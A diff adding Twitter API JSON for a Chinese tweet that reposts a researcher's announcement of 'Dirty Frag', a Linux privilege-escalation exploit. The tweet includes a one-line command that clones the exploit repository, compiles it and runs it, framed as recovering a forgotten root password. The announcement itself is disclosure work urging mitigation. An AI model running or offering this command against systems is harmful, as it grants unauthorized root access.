@@ -1,0 +1,478 @@
+{
+  "data": {
+    "article": {},
+    "attachments": {
+      "media_keys": [
+        "16_2052892802477096960"
+      ]
+    },
+    "author_id": "1165044876297134080",
+    "context_annotations": [
+      {
+        "domain": {
+          "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+          "id": "46",
+          "name": "Business Taxonomy"
+        },
+        "entity": {
+          "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to softwares, apps, communication equipments, hardwares",
+          "id": "1557697333571112960",
+          "name": "Technology Business"
+        }
+      },
+      {
+        "domain": {
+          "description": "Entity Service top level domain, every item that is in Entity Service should be in this domain",
+          "id": "30",
+          "name": "Entities [Entity Service]"
+        },
+        "entity": {
+          "description": "Technology and computing",
+          "id": "848920371311001600",
+          "name": "Technology"
+        }
+      },
+      {
+        "domain": {
+          "description": "A grouping of interests and hobbies entities, like Novelty Food or Destinations",
+          "id": "66",
+          "name": "Interests and Hobbies Category"
+        },
+        "entity": {
+          "description": "Linux",
+          "id": "848959431836487680",
+          "name": "Linux"
+        }
+      },
+      {
+        "domain": {
+          "description": "A taxonomy of user interests. ",
+          "id": "131",
+          "name": "Unified Twitter Taxonomy"
+        },
+        "entity": {
+          "description": "Linux",
+          "id": "848959431836487680",
+          "name": "Linux"
+        }
+      }
+    ],
+    "conversation_id": "2052892918239908308",
+    "created_at": "2026-05-08T23:26:27.000Z",
+    "edit_controls": {
+      "editable_until": "2026-05-09T00:26:27.000Z",
+      "edits_remaining": 5,
+      "is_edit_eligible": true
+    },
+    "edit_history_tweet_ids": [
+      "2052892918239908308"
+    ],
+    "entities": {
+      "urls": [
+        {
+          "description": "Contribute to V4bel/dirtyfrag development by creating an account on GitHub.",
+          "display_url": "github.com/V4bel/dirtyfra…",
+          "end": 67,
+          "expanded_url": "https://github.com/V4bel/dirtyfrag.git",
+          "images": [
+            {
+              "height": 600,
+              "url": "https://pbs.twimg.com/news_img/2052478878602641408/oF1EeOKj?format=jpg&name=orig",
+              "width": 1200
+            },
+            {
+              "height": 150,
+              "url": "https://pbs.twimg.com/news_img/2052478878602641408/oF1EeOKj?format=jpg&name=150x150",
+              "width": 150
+            }
+          ],
+          "start": 44,
+          "status": 200,
+          "title": "GitHub - V4bel/dirtyfrag",
+          "unwound_url": "https://github.com/V4bel/dirtyfrag",
+          "url": "https://t.co/PTwkkPsCuZ"
+        },
+        {
+          "display_url": "pic.x.com/uyHnqmJZGT",
+          "end": 177,
+          "expanded_url": "https://x.com/realNyarime/status/2052892918239908308/photo/1",
+          "media_key": "16_2052892802477096960",
+          "start": 154,
+          "url": "https://t.co/uyHnqmJZGT"
+        },
+        {
+          "display_url": "x.com/v4bel/status/2…",
+          "end": 201,
+          "expanded_url": "https://twitter.com/v4bel/status/2052464007857185136",
+          "start": 178,
+          "url": "https://t.co/yclDWkotpB"
+        }
+      ]
+    },
+    "geo": {},
+    "id": "2052892918239908308",
+    "lang": "zh",
+    "note_tweet": {
+      "entities": {}
+    },
+    "possibly_sensitive": false,
+    "public_metrics": {
+      "bookmark_count": 0,
+      "impression_count": 0,
+      "like_count": 0,
+      "quote_count": 0,
+      "reply_count": 0,
+      "retweet_count": 0
+    },
+    "referenced_tweets": [
+      {
+        "id": "2052464007857185136",
+        "type": "quoted"
+      }
+    ],
+    "reply_settings": "everyone",
+    "text": "如果你忘记了Linux系统的root密码，可以尝试找回并修改新密码\ngit clone https://t.co/PTwkkPsCuZ &amp;&amp; cd dirtyfrag &amp;&amp; gcc -O0 -Wall -o exp exp.c -lutil &amp;&amp; ./exp https://t.co/uyHnqmJZGT https://t.co/yclDWkotpB"
+  },
+  "includes": {
+    "media": [
+      {
+        "height": 1080,
+        "media_key": "16_2052892802477096960",
+        "preview_image_url": "https://pbs.twimg.com/tweet_video_thumb/HH1XII2agAAmL3e.jpg",
+        "public_metrics": {},
+        "type": "animated_gif",
+        "variants": [
+          {
+            "bit_rate": 0,
+            "content_type": "video/mp4",
+            "url": "https://video.twimg.com/tweet_video/HH1XII2agAAmL3e.mp4"
+          }
+        ],
+        "width": 1920
+      },
+      {
+        "height": 720,
+        "media_key": "16_2052463331261497344",
+        "preview_image_url": "https://pbs.twimg.com/tweet_video_thumb/HHvQhn5bQAAAXRA.jpg",
+        "public_metrics": {},
+        "type": "animated_gif",
+        "variants": [
+          {
+            "bit_rate": 0,
+            "content_type": "video/mp4",
+            "url": "https://video.twimg.com/tweet_video/HHvQhn5bQAAAXRA.mp4"
+          }
+        ],
+        "width": 1280
+      }
+    ],
+    "tweets": [
+      {
+        "article": {},
+        "attachments": {
+          "media_keys": [
+            "16_2052892802477096960"
+          ]
+        },
+        "author_id": "1165044876297134080",
+        "context_annotations": [
+          {
+            "domain": {
+              "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+              "id": "46",
+              "name": "Business Taxonomy"
+            },
+            "entity": {
+              "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to softwares, apps, communication equipments, hardwares",
+              "id": "1557697333571112960",
+              "name": "Technology Business"
+            }
+          },
+          {
+            "domain": {
+              "description": "Entity Service top level domain, every item that is in Entity Service should be in this domain",
+              "id": "30",
+              "name": "Entities [Entity Service]"
+            },
+            "entity": {
+              "description": "Technology and computing",
+              "id": "848920371311001600",
+              "name": "Technology"
+            }
+          },
+          {
+            "domain": {
+              "description": "A grouping of interests and hobbies entities, like Novelty Food or Destinations",
+              "id": "66",
+              "name": "Interests and Hobbies Category"
+            },
+            "entity": {
+              "description": "Linux",
+              "id": "848959431836487680",
+              "name": "Linux"
+            }
+          },
+          {
+            "domain": {
+              "description": "A taxonomy of user interests. ",
+              "id": "131",
+              "name": "Unified Twitter Taxonomy"
+            },
+            "entity": {
+              "description": "Linux",
+              "id": "848959431836487680",
+              "name": "Linux"
+            }
+          }
+        ],
+        "conversation_id": "2052892918239908308",
+        "created_at": "2026-05-08T23:26:27.000Z",
+        "edit_controls": {
+          "editable_until": "2026-05-09T00:26:27.000Z",
+          "edits_remaining": 5,
+          "is_edit_eligible": true
+        },
+        "edit_history_tweet_ids": [
+          "2052892918239908308"
+        ],
+        "entities": {
+          "urls": [
+            {
+              "description": "Contribute to V4bel/dirtyfrag development by creating an account on GitHub.",
+              "display_url": "github.com/V4bel/dirtyfra…",
+              "end": 67,
+              "expanded_url": "https://github.com/V4bel/dirtyfrag.git",
+              "images": [
+                {
+                  "height": 600,
+                  "url": "https://pbs.twimg.com/news_img/2052478878602641408/oF1EeOKj?format=jpg&name=orig",
+                  "width": 1200
+                },
+                {
+                  "height": 150,
+                  "url": "https://pbs.twimg.com/news_img/2052478878602641408/oF1EeOKj?format=jpg&name=150x150",
+                  "width": 150
+                }
+              ],
+              "start": 44,
+              "status": 200,
+              "title": "GitHub - V4bel/dirtyfrag",
+              "unwound_url": "https://github.com/V4bel/dirtyfrag",
+              "url": "https://t.co/PTwkkPsCuZ"
+            },
+            {
+              "display_url": "pic.x.com/uyHnqmJZGT",
+              "end": 177,
+              "expanded_url": "https://x.com/realNyarime/status/2052892918239908308/photo/1",
+              "media_key": "16_2052892802477096960",
+              "start": 154,
+              "url": "https://t.co/uyHnqmJZGT"
+            },
+            {
+              "display_url": "x.com/v4bel/status/2…",
+              "end": 201,
+              "expanded_url": "https://twitter.com/v4bel/status/2052464007857185136",
+              "start": 178,
+              "url": "https://t.co/yclDWkotpB"
+            }
+          ]
+        },
+        "geo": {},
+        "id": "2052892918239908308",
+        "lang": "zh",
+        "note_tweet": {
+          "entities": {}
+        },
+        "possibly_sensitive": false,
+        "public_metrics": {
+          "bookmark_count": 0,
+          "impression_count": 0,
+          "like_count": 0,
+          "quote_count": 0,
+          "reply_count": 0,
+          "retweet_count": 0
+        },
+        "referenced_tweets": [
+          {
+            "id": "2052464007857185136",
+            "type": "quoted"
+          }
+        ],
+        "reply_settings": "everyone",
+        "text": "如果你忘记了Linux系统的root密码，可以尝试找回并修改新密码\ngit clone https://t.co/PTwkkPsCuZ &amp;&amp; cd dirtyfrag &amp;&amp; gcc -O0 -Wall -o exp exp.c -lutil &amp;&amp; ./exp https://t.co/uyHnqmJZGT https://t.co/yclDWkotpB"
+      },
+      {
+        "article": {},
+        "attachments": {
+          "media_keys": [
+            "16_2052463331261497344"
+          ]
+        },
+        "author_id": "1195005701258506242",
+        "context_annotations": [
+          {
+            "domain": {
+              "description": "Categories within Brand Verticals that narrow down the scope of Brands",
+              "id": "46",
+              "name": "Business Taxonomy"
+            },
+            "entity": {
+              "description": "Brands, companies, advertisers and every non-person handle with the profit intent related to softwares, apps, communication equipments, hardwares",
+              "id": "1557697333571112960",
+              "name": "Technology Business"
+            }
+          },
+          {
+            "domain": {
+              "description": "Entity Service top level domain, every item that is in Entity Service should be in this domain",
+              "id": "30",
+              "name": "Entities [Entity Service]"
+            },
+            "entity": {
+              "description": "Technology and computing",
+              "id": "848920371311001600",
+              "name": "Technology"
+            }
+          },
+          {
+            "domain": {
+              "description": "A grouping of interests and hobbies entities, like Novelty Food or Destinations",
+              "id": "66",
+              "name": "Interests and Hobbies Category"
+            },
+            "entity": {
+              "description": "Linux",
+              "id": "848959431836487680",
+              "name": "Linux"
+            }
+          },
+          {
+            "domain": {
+              "description": "A taxonomy of user interests. ",
+              "id": "131",
+              "name": "Unified Twitter Taxonomy"
+            },
+            "entity": {
+              "description": "Linux",
+              "id": "848959431836487680",
+              "name": "Linux"
+            }
+          }
+        ],
+        "conversation_id": "2052464007857185136",
+        "created_at": "2026-05-07T19:02:07.000Z",
+        "edit_controls": {
+          "editable_until": "2026-05-07T20:02:07.000Z",
+          "edits_remaining": 5,
+          "is_edit_eligible": false
+        },
+        "edit_history_tweet_ids": [
+          "2052464007857185136"
+        ],
+        "entities": {
+          "urls": [
+            {
+              "display_url": "pic.x.com/2pfLnD77zy",
+              "end": 305,
+              "expanded_url": "https://x.com/v4bel/status/2052464007857185136/photo/1",
+              "media_key": "16_2052463331261497344",
+              "start": 282,
+              "url": "https://t.co/2pfLnD77zy"
+            }
+          ]
+        },
+        "geo": {},
+        "id": "2052464007857185136",
+        "lang": "en",
+        "note_tweet": {
+          "entities": {
+            "urls": [
+              {
+                "display_url": "dirtyfrag.io",
+                "end": 438,
+                "expanded_url": "https://dirtyfrag.io",
+                "start": 415,
+                "url": "https://t.co/9nqku4svkY"
+              }
+            ]
+          },
+          "text": "💥 Introducing \"Dirty Frag\"\n\nA universal Linux LPE chaining two vulns in xfrm-ESP and RxRPC. A successor class to Dirty Pipe & Copy Fail.\n\nNo race, no panic on failure, fully deterministic. ~9 years latent.\nUbuntu / RHEL / Fedora / openSUSE / CentOS / AlmaLinux, and more.\n\nEven if you've applied the \"Copy Fail\" mitigation, your Linux is still vulnerable to \"Dirty Frag\". Apply the Dirty Frag mitigation.\n\nDetails:\nhttps://t.co/9nqku4svkY"
+        },
+        "possibly_sensitive": false,
+        "public_metrics": {
+          "bookmark_count": 1004,
+          "impression_count": 414735,
+          "like_count": 1873,
+          "quote_count": 134,
+          "reply_count": 38,
+          "retweet_count": 639
+        },
+        "reply_settings": "everyone",
+        "text": "💥 Introducing \"Dirty Frag\"\n\nA universal Linux LPE chaining two vulns in xfrm-ESP and RxRPC. A successor class to Dirty Pipe &amp; Copy Fail.\n\nNo race, no panic on failure, fully deterministic. ~9 years latent.\nUbuntu / RHEL / Fedora / openSUSE / CentOS / AlmaLinux, and more.\n\nEven https://t.co/2pfLnD77zy"
+      }
+    ],
+    "users": [
+      {
+        "created_at": "2019-08-23T23:35:25.000Z",
+        "description": "乃月希, aka Nyarime｜Founder of Naixi Networks｜Developer｜ Photographer｜可以叫我希酱｜玩eSIM上奶昔论坛｜zh-cn/en｜❤️ @realYingxi",
+        "entities": {
+          "description": {
+            "mentions": [
+              {
+                "end": 108,
+                "start": 97,
+                "username": "realYingxi"
+              }
+            ]
+          },
+          "url": {
+            "urls": [
+              {
+                "display_url": "naixi.net",
+                "end": 23,
+                "expanded_url": "https://naixi.net",
+                "start": 0,
+                "url": "https://t.co/Gp1bHdXykZ"
+              }
+            ]
+          }
+        },
+        "id": "1165044876297134080",
+        "location": "Xiamen, Fujian, PR. China",
+        "name": "奶昔🥤",
+        "pinned_tweet_id": "2052743546026033264",
+        "profile_image_url": "https://pbs.twimg.com/profile_images/2037172678558425088/ZVuft4sK_normal.jpg",
+        "protected": false,
+        "public_metrics": {
+          "followers_count": 32432,
+          "following_count": 596,
+          "like_count": 13827,
+          "listed_count": 149,
+          "media_count": 1708,
+          "tweet_count": 11252
+        },
+        "url": "https://t.co/Gp1bHdXykZ",
+        "username": "realNyarime",
+        "verified": true
+      },
+      {
+        "created_at": "2019-11-14T15:49:00.000Z",
+        "description": "Independent Vuln. Researcher / Pwn2Own Berlin 2025 / Google kernelCTF 0-day / Pwnie Awards 2025",
+        "id": "1195005701258506242",
+        "name": "V4bel",
+        "profile_image_url": "https://pbs.twimg.com/profile_images/1270076359142862848/2x_qO-hl_normal.jpg",
+        "protected": false,
+        "public_metrics": {
+          "followers_count": 2550,
+          "following_count": 159,
+          "like_count": 465,
+          "listed_count": 21,
+          "media_count": 6,
+          "tweet_count": 49
+        },
+        "username": "v4bel",
+        "verified": true
+      }
+    ]
+  }
+}
